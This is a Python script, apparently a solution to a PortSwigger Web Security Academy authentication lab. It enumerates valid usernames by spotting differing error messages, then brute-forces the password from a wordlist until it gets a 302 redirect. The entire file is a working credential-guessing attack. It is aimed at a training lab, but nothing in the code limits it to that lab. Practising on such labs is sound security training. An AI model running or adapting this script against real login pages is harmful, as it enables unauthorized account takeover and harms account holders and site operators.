import requests
import argparse
import time
import sys

""" Explanation:
This script performs a dictionary-based brute-force attack to solve the 
'Username enumeration via different responses' lab from PortSwigger Web Security Academy.

It works in two phases:
1. Username Enumeration: It iterates through a provided list of usernames, testing each 
   with a dummy password. It analyzes the HTTP response to detect anomalies (like a change 
   from 'Invalid username' to 'Incorrect password'), allowing it to identify a valid user.
2. Password Brute-forcing: Once the valid username is found, it iterates through a list 
   of passwords. It identifies the correct password by looking for a 302 Found HTTP 
   redirect, which indicates a successful login.
"""

# Here we define a function to read the wordlists for usernames and passwords.
def load_wordlists(u_path, p_path):
    with open(u_path, "r") as f:
        usernames = f.read().splitlines()
    with open(p_path, "r") as f:
        passwords = f.read().splitlines()
    return usernames, passwords

def brute_force_login(url, usernames_file, passwords_file):
    # First, we load our dictionaries into memory.
    usernames, passwords = load_wordlists(usernames_file, passwords_file)
    
    # We create a session to maintain connection pooling and handle potential cookies.
    session = requests.Session()

    found_username = None
    
    # We define the start time to calculate the time taken to finish the attack.
    start_time = time.time()

    # --- Phase 1: USERNAME ENUMERATION ---
    print("[*] Starting username enumeration...")
    for user in usernames:
        # We use \033[K to clear the line, preventing visual artifacts in the terminal.
        print(f"[-] Testing username: {user}\033[K", end="\r")
        
        # In the payload, we use a notoriously false password to trigger an error.
        data = {"username": user, "password": "dummy_password_123"}
        response = session.post(url, data=data)

        # Here we check if the response indicates the user exists but the password is wrong.
        if "Incorrect password" in response.text:
            print(f"[+] Valid username identified: {user}\033[K")
            found_username = user
            break

    # If no user is found, we exit the script gracefully.
    if not found_username:
        print("\n[!] No valid username found in the provided list.")
        sys.exit(1)

    # --- Phase 2: PASSWORD BRUTE-FORCING ---
    print(f"\n[*] Starting password brute-force for user: {found_username}...")
    for pwd in passwords:
        print(f"[-] Testing password: {pwd}\033[K", end="\r")
        
        data = {"username": found_username, "password": pwd}
        
        # We set allow_redirects=False to catch the 302 status code that PortSwigger 
        # uses to redirect the user upon a successful login.
        response = session.post(url, data=data, allow_redirects=False)

        # And here is the validation to check if the login was successful.
        if response.status_code == 302:
            print(f"[!!!] PASSWORD FOUND: {pwd}\033[K")
            print(f"[✔] Time taken: {time.time() - start_time:.2f} seconds")
            return

    # If the loop finishes without returning, the password was not in the wordlist.
    print("\n[!] Password not found in the provided list.")

# We define the argument parser to get the target URL and file paths from the command line.
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force script for PortSwigger Authentication Lab")
    parser.add_argument(
        "-u", 
        "--url", 
        required=True, 
        help="Target URL (e.g., https://<id>.web-security-academy.net/login)"
    )
    parser.add_argument(
        "-U", 
        "--usernames", 
        required=True, 
        help="Path to the usernames wordlist"
    )
    parser.add_argument(
        "-P", 
        "--passwords", 
        required=True, 
        help="Path to the passwords wordlist"
    )
    args = parser.parse_args()

    print(f"[*] Initializing attack on {args.url}...\n")
    brute_force_login(args.url, args.usernames, args.passwords)